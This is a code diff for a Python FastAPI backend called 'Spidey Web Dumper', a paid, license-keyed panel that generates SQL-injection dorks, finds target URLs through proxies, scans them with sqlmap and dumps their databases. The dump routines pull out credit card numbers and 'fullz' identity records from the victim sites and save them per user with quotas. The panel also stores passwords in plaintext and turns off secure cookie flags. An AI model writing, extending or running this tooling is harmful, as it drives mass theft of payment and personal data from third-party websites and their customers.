@@ -1,7 +1,6 @@
 """
-Spidey Web Dumper — FastAPI Backend (CLEAN v5.0)
-Saare processes fix: keywords, dorks, parser, sqli, dump, proxy
-+ alldumps.txt feature
+Spidey Web Dumper — FastAPI Backend (FINAL v6.0)
+Cookie fix + Register + Admin + All processes fixed
 """
 import os
 import io
@@ -60,7 +59,7 @@ os.makedirs(STATIC_DIR, exist_ok=True)
 #  CONFIG
 # ═══════════════════════════════════════════════════════════════════════════
 SECRET_KEY        = os.environ.get("SECRET_KEY", "spidey-web-secret-change-this-123")
-ADMIN_USERNAME    = os.environ.get("ADMIN_USERNAME", "admin")
+ADMIN_USERNAME    = os.environ.get("ADMIN_USERNAME", "admin").lower()
 ADMIN_PASSWORD    = os.environ.get("ADMIN_PASSWORD", "SpideyPass123!")
 SESSION_MAX_AGE   = 86400 * 7
 
@@ -88,7 +87,7 @@ ADMIN_PATH = os.environ.get("ADMIN_PATH", "/admin").strip()
 if not ADMIN_PATH.startswith("/"):
     ADMIN_PATH = "/" + ADMIN_PATH
 
-SESSION_IDLE_TIMEOUT = 3600
+SESSION_IDLE_TIMEOUT = 3600 * 24  # 24 hours
 SESSIONS = {}
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -231,7 +230,9 @@ def save_users(d: dict):
 
 
 def get_user(uid: str) -> Optional[dict]:
-    return load_users().get(uid)
+    if not uid:
+        return None
+    return load_users().get(uid.lower())
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -381,7 +382,7 @@ def cleanup_old_tasks(max_age_hours: int = 24):
 #  AUTH
 # ═══════════════════════════════════════════════════════════════════════════
 def create_session_token(username: str) -> str:
-    return serializer.dumps({"u": username, "t": time.time()})
+    return serializer.dumps({"u": username.lower(), "t": time.time()})
 
 
 def verify_session_token(token: str) -> Optional[str]:
@@ -419,7 +420,8 @@ def require_user(request: Request) -> str:
         raise HTTPException(status_code=401, detail="Not logged in")
     user = get_user(uid)
     if not user:
-        raise HTTPException(status_code=401, detail="User not found")
+        # Session valid but user file reset → auto-logout
+        raise HTTPException(status_code=401, detail="User not found. Please login again.")
     exp = user.get("expires")
     if exp and not user.get("is_admin"):
         try:
@@ -554,7 +556,9 @@ def list_outputs() -> List[dict]:
 async def root(request: Request):
     uid = get_current_user(request)
     if uid:
-        return RedirectResponse("/dashboard", status_code=302)
+        user = get_user(uid)
+        if user:
+            return RedirectResponse("/dashboard", status_code=302)
     return RedirectResponse("/login", status_code=302)
 
 
@@ -562,7 +566,9 @@ async def root(request: Request):
 async def login_page(request: Request, error: str = None, msg: str = None):
     uid = get_current_user(request)
     if uid:
-        return RedirectResponse("/dashboard", status_code=302)
+        user = get_user(uid)
+        if user:
+            return RedirectResponse("/dashboard", status_code=302)
     return render("login.html", {"request": request, "error": error, "msg": msg})
 
 
@@ -571,23 +577,29 @@ async def login_submit(request: Request, username: str = Form(...), password: st
     ip = get_client_ip(request)
     if not check_ip_whitelist(ip):
         return RedirectResponse("/login?error=Access+denied", status_code=302)
+    
     allowed, seconds_left = check_lockout(ip)
     if not allowed:
         mins = seconds_left // 60
         return RedirectResponse(f"/login?error=Locked+out.+Wait+{mins}+min", status_code=302)
+    
     if not check_rate_limit(ip):
         return RedirectResponse("/login?error=Too+many+attempts", status_code=302)
+    
     username = username.strip().lower()
     users = load_users()
     GENERIC_ERR = "Invalid+credentials"
+    
     if username not in users:
         record_failed_login(ip, username)
         return RedirectResponse(f"/login?error={GENERIC_ERR}", status_code=302)
+    
     user = users[username]
     stored = user.get("password", "")
     if not secrets.compare_digest(str(stored), str(password)):
         record_failed_login(ip, username)
         return RedirectResponse(f"/login?error={GENERIC_ERR}", status_code=302)
+    
     exp = user.get("expires")
     if exp and not user.get("is_admin"):
         try:
@@ -596,12 +608,28 @@ async def login_submit(request: Request, username: str = Form(...), password: st
                 return RedirectResponse("/login?error=Plan+expired", status_code=302)
         except Exception:
             pass
+    
+    # ✅ Create session
     token = create_session_token(username)
     fingerprint = make_fingerprint(request)
-    SESSIONS[token] = {"uid": username, "fingerprint": fingerprint, "last_active": time.time(), "ip": ip}
+    SESSIONS[token] = {
+        "uid": username,
+        "fingerprint": fingerprint,
+        "last_active": time.time(),
+        "ip": ip,
+    }
     reset_failed_logins(ip)
+    logger.info(f"[login] SUCCESS: {username} from {ip}")
+    
     resp = RedirectResponse("/dashboard", status_code=302)
-    resp.set_cookie("spidey_session", token, httponly=True, secure=True, max_age=SESSION_MAX_AGE, samesite="strict")
+    resp.set_cookie(
+        "spidey_session", token,
+        httponly=True,
+        secure=False,           # ✅ HTTP + HTTPS dono pe kaam kare
+        max_age=SESSION_MAX_AGE,
+        samesite="lax",          # ✅ Mobile friendly
+        path="/",                # ✅ Har route pe available
+    )
     return resp
 
 
@@ -611,45 +639,72 @@ async def logout(request: Request):
     if token and token in SESSIONS:
         SESSIONS.pop(token, None)
     resp = RedirectResponse("/login?msg=Logged+out", status_code=302)
-    resp.delete_cookie("spidey_session")
+    resp.delete_cookie("spidey_session", path="/")
     return resp
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  REGISTER
+# ═══════════════════════════════════════════════════════════════════════════
 @app.get("/register", response_class=HTMLResponse)
 async def register_page(request: Request, error: str = None, msg: str = None):
     uid = get_current_user(request)
     if uid:
-        return RedirectResponse("/dashboard", status_code=302)
+        user = get_user(uid)
+        if user:
+            return RedirectResponse("/dashboard", status_code=302)
     return render("register.html", {"request": request, "error": error, "msg": msg})
 
 
 @app.post("/register")
-async def register_submit(request: Request, username: str = Form(...), password: str = Form(...), license_key: str = Form(...)):
+async def register_submit(
+    request: Request,
+    username: str = Form(...),
+    password: str = Form(...),
+    license_key: str = Form(...),
+):
     ip = get_client_ip(request)
+    
     if not check_ip_whitelist(ip):
         return RedirectResponse("/register?error=Access+denied", status_code=302)
+    
     if not check_rate_limit(ip, max_attempts=10, window=300):
         return RedirectResponse("/register?error=Too+many+attempts", status_code=302)
+    
     username = username.strip().lower()
+    
+    # Validate username
     if len(username) < 3 or len(username) > 20:
         return RedirectResponse("/register?error=Username+must+be+3-20+chars", status_code=302)
+    
     if not all(c.isalnum() or c == "_" for c in username):
         return RedirectResponse("/register?error=Only+letters+numbers+underscore", status_code=302)
+    
+    # Validate password
     ok, msg = check_strong_password(password)
     if not ok:
         return RedirectResponse(f"/register?error={msg.replace(' ', '+')}", status_code=302)
+    
+    # Check existing user
     users = load_users()
     if username in users:
         return RedirectResponse("/register?error=Username+taken", status_code=302)
+    
+    # Validate license key
     key = license_key.strip().upper()
     keys = load_keys()
     if key not in keys:
+        logger.warning(f"[register] Invalid key from {ip}")
         return RedirectResponse("/register?error=Invalid+license+key", status_code=302)
+    
     key_data = keys[key]
     if key_data.get("used_by"):
         return RedirectResponse("/register?error=Key+already+used", status_code=302)
+    
+    # Create user
     plan_code = key_data.get("plan", "1d")
     plan = PLANS.get(plan_code, PLANS["1d"])
+    
     users[username] = {
         "username": username,
         "password": password,
@@ -664,11 +719,14 @@ async def register_submit(request: Request, username: str = Form(...), password:
         "proxy_stats": {"live": 0, "dead": 0, "total": 0, "checked_at": None},
     }
     save_users(users)
+    
+    # Mark key as used
     keys[key]["used_by"] = username
     keys[key]["used_at"] = datetime.now().isoformat()
     save_keys(keys)
+    
     logger.info(f"[register] New user: {username} | plan: {plan_code}")
-    return RedirectResponse("/login?msg=Account+created!+Login+now", status_code=302)
+    return RedirectResponse("/login?msg=Account+created!+Please+login", status_code=302)
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  REDEEM
@@ -839,7 +897,7 @@ async def logs_page(request: Request):
     return render("logs.html", {"request": request, "uid": uid, "tasks": user_tasks[:50]})
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  KEYWORDS
+#  KEYWORDS API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/keywords/generate")
 async def api_keywords_generate(request: Request, seeds: str = Form(...), count: int = Form(1000)):
@@ -862,12 +920,10 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} keywords...", total=count)
         add_log(tid, f"Generating {count} keywords")
-
         from core.generators import generate_keywords
         loop = asyncio.get_running_loop()
         kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
         kws = kws[:count]
-
         total_kws = len(kws)
         step = max(1, total_kws // 20)
         for i in range(0, total_kws, step):
@@ -876,7 +932,6 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
                 return
             update_progress(tid, done=i, total=total_kws, msg=f"Generating... {i}/{total_kws}")
             await asyncio.sleep(0.05)
-
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"keywords_{len(kws)}_{ts}.txt", "\n".join(kws))
         consume_quota(uid, "keywords", len(kws))
@@ -888,255 +943,8 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
         logger.exception(f"[keywords:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
 
-
-
-
-
-
-async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
-    """Dump with CC + Fullz + AllDumps capture"""
-    try:
-        logger.info(f"[dump:{tid}] STARTED")
-        update_task(tid, status="running")
-        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
-        proxies = get_user_proxies(uid)
-
-        from core.sqlmap_api import api_dump_multiple
-        from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
-
-        all_cards = set()
-        all_fullz = []
-        all_raw_dumps = []
-        last_edit = [time.time()]
-
-        async def on_prog(done, total, success):
-            if is_cancelled(tid):
-                return
-            now = time.time()
-            if now - last_edit[0] < 1.0:
-                return
-            last_edit[0] = now
-            update_progress(
-                tid, done=done, total=total,
-                cards=len(all_cards), fullz=len(all_fullz),
-                msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}"
-            )
-
-        async def on_result(r, zip_bytes):
-            # Extract CC
-            if getattr(r, "cards", None):
-                for c in r.cards:
-                    all_cards.add(c)
-            
-            # Extract Fullz
-            try:
-                src = getattr(r, "csv_dir", "") or ""
-                if src and os.path.isdir(src):
-                    recs = extract_fullz_from_dir(src)
-                    if recs:
-                        all_fullz.extend(recs)
-            except Exception as e:
-                logger.error(f"[dump] fullz extract: {e}")
-            
-            # Capture raw dump
-            try:
-                dump_text = _capture_raw_dump(r)
-                if dump_text:
-                    all_raw_dumps.append(dump_text)
-                    n_lines = len(dump_text.splitlines())
-                    add_log(tid, f"📦 {r.url[:50]} | {n_lines} lines")
-                else:
-                    add_log(tid, f"⚠️ {r.url[:50]} | No data")
-            except Exception as e:
-                logger.exception(f"[dump] raw capture failed: {e}")
-                add_log(tid, f"⚠️ {r.url[:50]} | Capture fail")
-
-        try:
-            await api_dump_multiple(
-                urls, proxy_list=proxies, level=level, risk=risk,
-                technique=technique, threads=threads, tamper=tamper,
-                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
-                task_id=tid,
-            )
-        except TypeError:
-            await api_dump_multiple(
-                urls, proxy_list=proxies, level=level, risk=risk,
-                technique=technique, threads=threads, tamper=tamper,
-                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
-            )
-
-        all_cards = list(all_cards)
-        ts = datetime.now().strftime("%d%m%y_%H%M%S")
-        result = {}
-
-        if all_cards:
-            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
-            result["cards_file"] = cc_name
-            result["cards"] = len(all_cards)
-            consume_quota(uid, "cards", len(all_cards))
-
-        if all_fullz:
-            seen = set()
-            dedup = []
-            for rec in all_fullz:
-                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
-                if key in seen:
-                    continue
-                seen.add(key)
-                dedup.append(rec)
-            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
-            if rich:
-                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
-                                       "\n".join(fullz_records_to_lines(rich, "full")))
-                result["fullz_file"] = fz_name
-                result["fullz"] = len(rich)
-                consume_quota(uid, "fullz", len(rich))
-
-        if all_raw_dumps:
-            content = "\n".join(all_raw_dumps)
-            n_lines = len(content.splitlines())
-            al_name = save_output(uid, f"alldumps_{n_lines}_{ts}.txt", content)
-            result["alldump_file"] = al_name
-            result["alldump_lines"] = n_lines
-        else:
-            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data extracted\n# URLs may not be vulnerable")
-            result["alldump_file"] = al_name
-            result["alldump_lines"] = 0
-
-        consume_quota(uid, "dumps", len(urls))
-        save_last_response(uid, "dump", {
-            "tested": len(urls),
-            "cards": result.get("cards", 0),
-            "fullz": result.get("fullz", 0),
-            "alldump_lines": result.get("alldump_lines", 0),
-            "cards_file": result.get("cards_file", ""),
-            "fullz_file": result.get("fullz_file", ""),
-            "alldump_file": result.get("alldump_file", ""),
-        })
-        update_task(tid, status="done", result=result)
-        update_progress(tid, done=len(urls), total=len(urls),
-                        cards=result.get("cards", 0),
-                        fullz=result.get("fullz", 0),
-                        msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Dumps:{result.get('alldump_lines',0)}")
-        add_log(tid, f"✅ Done — CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Raw:{result.get('alldump_lines',0)}")
-        logger.info(f"[dump:{tid}] DONE")
-    except asyncio.CancelledError:
-        add_log(tid, "⛔ Cancelled")
-        update_progress(tid, msg="⛔ Cancelled")
-    except Exception as e:
-        logger.exception(f"[dump:{tid}] ERROR")
-        update_task(tid, status="error", error=str(e))
-        add_log(tid, f"❌ Error: {str(e)[:200]}")
-        
-        
-        
-        
-def _capture_raw_dump(result) -> str:
-    """Capture ALL data from sqlmap result for alldumps.txt"""
-    lines = []
-    url = getattr(result, "url", "unknown")
-    lines.append("# " + "=" * 68)
-    lines.append(f"# URL: {url}")
-    lines.append(f"# Task: {getattr(result, 'taskid', '')}")
-    lines.append(f"# Success: {getattr(result, 'success', False)}")
-    lines.append(f"# DBMS: {getattr(result, 'dbms', '') or getattr(result, 'banner', '')}")
-    lines.append(f"# User: {getattr(result, 'current_user', '')}")
-    lines.append(f"# Database: {getattr(result, 'current_db', '')}")
-    lines.append("# " + "=" * 68)
-    lines.append("")
-
-    # 1. Tables
-    tables = getattr(result, "tables", []) or []
-    if tables:
-        lines.append(f"### TABLES FOUND ({len(tables)})")
-        for t in tables:
-            if isinstance(t, dict):
-                for db_name, tlist in t.items():
-                    lines.append(f"# DB: {db_name}")
-                    if isinstance(tlist, list):
-                        for tbl in tlist:
-                            lines.append(f"  - {tbl}")
-            else:
-                lines.append(f"  - {t}")
-        lines.append("")
-
-    # 2. Data rows
-    data_rows = getattr(result, "data_rows", []) or []
-    if data_rows:
-        lines.append(f"### DATA ROWS ({len(data_rows)})")
-        for item in data_rows:
-            tbl = item.get("table", "unknown") if isinstance(item, dict) else "unknown"
-            row = item.get("row", item) if isinstance(item, dict) else item
-            if isinstance(row, dict):
-                row_str = "|".join(f"{k}={v}" for k, v in row.items())
-            elif isinstance(row, (list, tuple)):
-                row_str = "|".join(str(c) for c in row)
-            else:
-                row_str = str(row)
-            lines.append(f"[{tbl}] {row_str}")
-        lines.append("")
-
-    # 3. CSV files
-    csv_files = getattr(result, "csv_files", []) or []
-    csv_dir = getattr(result, "csv_dir", "") or ""
-    if csv_dir and os.path.isdir(csv_dir) and not csv_files:
-        for root, _, files in os.walk(csv_dir):
-            for fn in files:
-                if fn.endswith(".csv"):
-                    csv_files.append(os.path.join(root, fn))
-
-    if csv_files:
-        lines.append(f"### CSV FILES ({len(csv_files)})")
-        for fpath in csv_files[:20]:
-            try:
-                fname = os.path.basename(fpath)
-                lines.append("")
-                lines.append(f"--- {fname} ---")
-                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
-                    content = f.read()
-                    content_lines = content.splitlines()[:500]
-                    lines.extend(content_lines)
-                    if len(content.splitlines()) > 500:
-                        lines.append(f"... [{len(content.splitlines()) - 500} more lines]")
-            except Exception as e:
-                lines.append(f"# CSV read error: {e}")
-        lines.append("")
-
-    # 4. Raw log
-    raw_output = getattr(result, "raw_output", "") or ""
-    log_lines = getattr(result, "log_lines", []) or []
-    if not raw_output and log_lines:
-        raw_output = "\n".join(log_lines)
-
-    if raw_output:
-        lines.append(f"### SQLMAP LOG (last 100 lines)")
-        log_split = raw_output.splitlines()
-        for line in log_split[-100:]:
-            lines.append(line)
-        lines.append("")
-
-    # 5. Cards
-    cards = getattr(result, "cards", []) or []
-    if cards:
-        lines.append(f"### CARDS ({len(cards)})")
-        for c in cards:
-            lines.append(str(c))
-        lines.append("")
-
-    # 6. Empty case
-    if len(lines) <= 9:
-        lines.append("")
-        lines.append("# ⚠️ NO DATA EXTRACTED")
-        lines.append("# Reasons: URL not vulnerable / no permission / sqlmap timeout / empty tables")
-        lines.append("")
-
-    lines.append("")
-    lines.append("")
-    return "\n".join(lines)
-            
-        
 # ═══════════════════════════════════════════════════════════════════════════
-#  DORKS
+#  DORKS API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/dorks/generate")
 async def api_dorks_generate(request: Request, keywords: str = Form(...), count: int = Form(5000), dork_type: str = Form("normal")):
@@ -1159,7 +967,6 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} dorks ({dtype})...", total=count)
         add_log(tid, f"Type: {dtype}")
-
         from core.generators import (
             generate_dorks, generate_hq_sqli_dorks, generate_country_dorks,
             generate_cms_dorks, generate_exposed_dorks,
@@ -1176,7 +983,6 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         else:
             dorks = await loop.run_in_executor(None, generate_dorks, kws, count)
         dorks = dorks[:count]
-
         total_d = len(dorks)
         step = max(1, total_d // 20)
         for i in range(0, total_d, step):
@@ -1185,7 +991,6 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
                 return
             update_progress(tid, done=i, total=total_d, msg=f"Generating... {i}/{total_d}")
             await asyncio.sleep(0.05)
-
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"dorks_{dtype}_{len(dorks)}_{ts}.txt", "\n".join(dorks))
         consume_quota(uid, "dorks", len(dorks))
@@ -1198,7 +1003,7 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         update_task(tid, status="error", error=str(e))
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  PARSER
+#  PARSER API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/parser/run")
 async def api_parser_run(request: Request, dorks: str = Form(...)):
@@ -1221,7 +1026,6 @@ async def _run_parser(tid: str, uid: str, dorks: List[str]):
         update_progress(tid, msg=f"Parsing {total} dorks...", total=total)
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
-
         from core.url_finder import search_urls_from_dorks
         last_edit = [time.time()]
 
@@ -1256,7 +1060,6 @@ async def api_proxy_check(request: Request):
     if not proxies:
         return JSONResponse({"error": "No proxies to check"}, status_code=400)
     tid = new_task(uid, "proxy_check", {"total": len(proxies)})
-    logger.info(f"[proxy] Task {tid} for {len(proxies)} proxies")
     asyncio.create_task(_run_proxy_check(tid, uid, proxies))
     return {"task_id": tid}
 
@@ -1268,7 +1071,6 @@ async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
         update_task(tid, status="running")
         update_progress(tid, done=0, total=total, live=0, msg=f"Checking {total} proxies...")
         add_log(tid, f"Checking {total} proxies")
-
         from core.proxy import check_proxies_bulk
         last_edit = [time.time()]
 
@@ -1300,7 +1102,6 @@ async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
         update_task(tid, status="done", result={"checked": total, "live": len(live_list), "dead": dead_count})
         update_progress(tid, done=total, total=total, live=len(live_list), msg="✅ Done!")
         add_log(tid, f"✅ Live: {len(live_list)}/{total}")
-        logger.info(f"[proxy:{tid}] DONE")
     except Exception as e:
         logger.exception(f"[proxy:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
@@ -1380,7 +1181,7 @@ async def api_proxy_list(request: Request):
     return {"ok": True, "proxies": proxies, "count": len(proxies), "stats": stats}
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  SQLI
+#  SQLI API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/sqli/scan")
 async def api_sqli_scan(request: Request, urls: str = Form(...)):
@@ -1479,7 +1280,7 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
         update_task(tid, status="error", error=str(e))
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  DUMP (with alldumps.txt)
+#  DUMP API
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/dump/run")
 async def api_dump_run(request: Request, urls: str = Form(...), level: int = Form(3),
@@ -1505,8 +1306,223 @@ async def api_dump_run(request: Request, urls: str = Form(...), level: int = For
     return {"task_id": tid}
 
 
+async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
+    try:
+        logger.info(f"[dump:{tid}] STARTED")
+        update_task(tid, status="running")
+        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
+        proxies = get_user_proxies(uid)
+        from core.sqlmap_api import api_dump_multiple
+        from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
+        all_cards = set()
+        all_fullz = []
+        all_raw_dumps = []
+        last_edit = [time.time()]
+
+        async def on_prog(done, total, success):
+            if is_cancelled(tid):
+                return
+            now = time.time()
+            if now - last_edit[0] < 1.0:
+                return
+            last_edit[0] = now
+            update_progress(
+                tid, done=done, total=total,
+                cards=len(all_cards), fullz=len(all_fullz),
+                msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}"
+            )
+
+        async def on_result(r, zip_bytes):
+            if getattr(r, "cards", None):
+                for c in r.cards:
+                    all_cards.add(c)
+            try:
+                src = getattr(r, "csv_dir", "") or ""
+                if src and os.path.isdir(src):
+                    recs = extract_fullz_from_dir(src)
+                    if recs:
+                        all_fullz.extend(recs)
+            except Exception as e:
+                logger.error(f"[dump] fullz: {e}")
+            try:
+                dump_text = _capture_raw_dump(r)
+                if dump_text:
+                    all_raw_dumps.append(dump_text)
+                    n_lines = len(dump_text.splitlines())
+                    add_log(tid, f"📦 {r.url[:50]} | {n_lines} lines")
+                else:
+                    add_log(tid, f"⚠️ {r.url[:50]} | No data")
+            except Exception as e:
+                logger.exception(f"[dump] raw capture: {e}")
+                add_log(tid, f"⚠️ {r.url[:50]} | Capture fail")
+
+        try:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
+                task_id=tid,
+            )
+        except TypeError:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
+            )
+
+        all_cards = list(all_cards)
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        result = {}
+
+        if all_cards:
+            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
+            result["cards_file"] = cc_name
+            result["cards"] = len(all_cards)
+            consume_quota(uid, "cards", len(all_cards))
+
+        if all_fullz:
+            seen = set()
+            dedup = []
+            for rec in all_fullz:
+                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
+                if key in seen:
+                    continue
+                seen.add(key)
+                dedup.append(rec)
+            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
+            if rich:
+                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
+                                       "\n".join(fullz_records_to_lines(rich, "full")))
+                result["fullz_file"] = fz_name
+                result["fullz"] = len(rich)
+                consume_quota(uid, "fullz", len(rich))
+
+        if all_raw_dumps:
+            content = "\n".join(all_raw_dumps)
+            n_lines = len(content.splitlines())
+            al_name = save_output(uid, f"alldumps_{n_lines}_{ts}.txt", content)
+            result["alldump_file"] = al_name
+            result["alldump_lines"] = n_lines
+        else:
+            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data extracted")
+            result["alldump_file"] = al_name
+            result["alldump_lines"] = 0
+
+        consume_quota(uid, "dumps", len(urls))
+        save_last_response(uid, "dump", {
+            "tested": len(urls),
+            "cards": result.get("cards", 0),
+            "fullz": result.get("fullz", 0),
+            "alldump_lines": result.get("alldump_lines", 0),
+            "cards_file": result.get("cards_file", ""),
+            "fullz_file": result.get("fullz_file", ""),
+            "alldump_file": result.get("alldump_file", ""),
+        })
+        update_task(tid, status="done", result=result)
+        update_progress(tid, done=len(urls), total=len(urls),
+                        cards=result.get("cards", 0),
+                        fullz=result.get("fullz", 0),
+                        msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Dumps:{result.get('alldump_lines',0)}")
+        add_log(tid, f"✅ Done — CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Raw:{result.get('alldump_lines',0)}")
+    except Exception as e:
+        logger.exception(f"[dump:{tid}] ERROR")
+        update_task(tid, status="error", error=str(e))
+        add_log(tid, f"❌ Error: {str(e)[:200]}")
 
 
+def _capture_raw_dump(result) -> str:
+    lines = []
+    url = getattr(result, "url", "unknown")
+    lines.append("# " + "=" * 68)
+    lines.append(f"# URL: {url}")
+    lines.append(f"# Task: {getattr(result, 'taskid', '')}")
+    lines.append(f"# Success: {getattr(result, 'success', False)}")
+    lines.append(f"# DBMS: {getattr(result, 'dbms', '') or getattr(result, 'banner', '')}")
+    lines.append(f"# User: {getattr(result, 'current_user', '')}")
+    lines.append(f"# Database: {getattr(result, 'current_db', '')}")
+    lines.append("# " + "=" * 68)
+    lines.append("")
+
+    tables = getattr(result, "tables", []) or []
+    if tables:
+        lines.append(f"### TABLES FOUND ({len(tables)})")
+        for t in tables:
+            if isinstance(t, dict):
+                for db_name, tlist in t.items():
+                    lines.append(f"# DB: {db_name}")
+                    if isinstance(tlist, list):
+                        for tbl in tlist:
+                            lines.append(f"  - {tbl}")
+            else:
+                lines.append(f"  - {t}")
+        lines.append("")
+
+    data_rows = getattr(result, "data_rows", []) or []
+    if data_rows:
+        lines.append(f"### DATA ROWS ({len(data_rows)})")
+        for item in data_rows:
+            tbl = item.get("table", "unknown") if isinstance(item, dict) else "unknown"
+            row = item.get("row", item) if isinstance(item, dict) else item
+            if isinstance(row, dict):
+                row_str = "|".join(f"{k}={v}" for k, v in row.items())
+            elif isinstance(row, (list, tuple)):
+                row_str = "|".join(str(c) for c in row)
+            else:
+                row_str = str(row)
+            lines.append(f"[{tbl}] {row_str}")
+        lines.append("")
+
+    csv_files = getattr(result, "csv_files", []) or []
+    csv_dir = getattr(result, "csv_dir", "") or ""
+    if csv_dir and os.path.isdir(csv_dir) and not csv_files:
+        for root, _, files in os.walk(csv_dir):
+            for fn in files:
+                if fn.endswith(".csv"):
+                    csv_files.append(os.path.join(root, fn))
+
+    if csv_files:
+        lines.append(f"### CSV FILES ({len(csv_files)})")
+        for fpath in csv_files[:20]:
+            try:
+                fname = os.path.basename(fpath)
+                lines.append("")
+                lines.append(f"--- {fname} ---")
+                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    content_lines = content.splitlines()[:500]
+                    lines.extend(content_lines)
+                    if len(content.splitlines()) > 500:
+                        lines.append(f"... [{len(content.splitlines()) - 500} more lines]")
+            except Exception as e:
+                lines.append(f"# CSV read error: {e}")
+        lines.append("")
+
+    raw_output = getattr(result, "raw_output", "") or ""
+    log_lines = getattr(result, "log_lines", []) or []
+    if not raw_output and log_lines:
+        raw_output = "\n".join(log_lines)
+    if raw_output:
+        lines.append(f"### SQLMAP LOG (last 100 lines)")
+        log_split = raw_output.splitlines()
+        for line in log_split[-100:]:
+            lines.append(line)
+        lines.append("")
+
+    cards = getattr(result, "cards", []) or []
+    if cards:
+        lines.append(f"### CARDS ({len(cards)})")
+        for c in cards:
+            lines.append(str(c))
+        lines.append("")
+
+    if len(lines) <= 9:
+        lines.append("")
+        lines.append("# ⚠️ NO DATA EXTRACTED")
+        lines.append("")
+
+    lines.append("")
+    lines.append("")
+    return "\n".join(lines)
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  TASK STATUS & CANCEL
@@ -1719,14 +1735,6 @@ async def admin_stats(request: Request):
     uid = require_admin(request)
     users = load_users()
     keys = load_keys()
-    try:
-        import psutil
-        proc = psutil.Process()
-        mem_str = f"{proc.memory_info().rss / 1024 / 1024:.1f} MB"
-        cpu_str = f"{psutil.cpu_percent(interval=0.1):.1f}%"
-    except Exception:
-        mem_str = "N/A"
-        cpu_str = "N/A"
     import platform
     stats = {
         "total_users": len(users),
@@ -1735,8 +1743,8 @@ async def admin_stats(request: Request):
         "used_keys": sum(1 for k in keys.values() if k.get("used_by")),
         "free_keys": sum(1 for k in keys.values() if not k.get("used_by")),
         "active_tasks": len(TASKS),
-        "mem": mem_str, "cpu": cpu_str,
-        "python": platform.python_version(), "os": platform.system(),
+        "python": platform.python_version(),
+        "os": platform.system(),
         "locked_ips": len(LOCKED_IPS),
         "active_sessions": len(SESSIONS),
     }
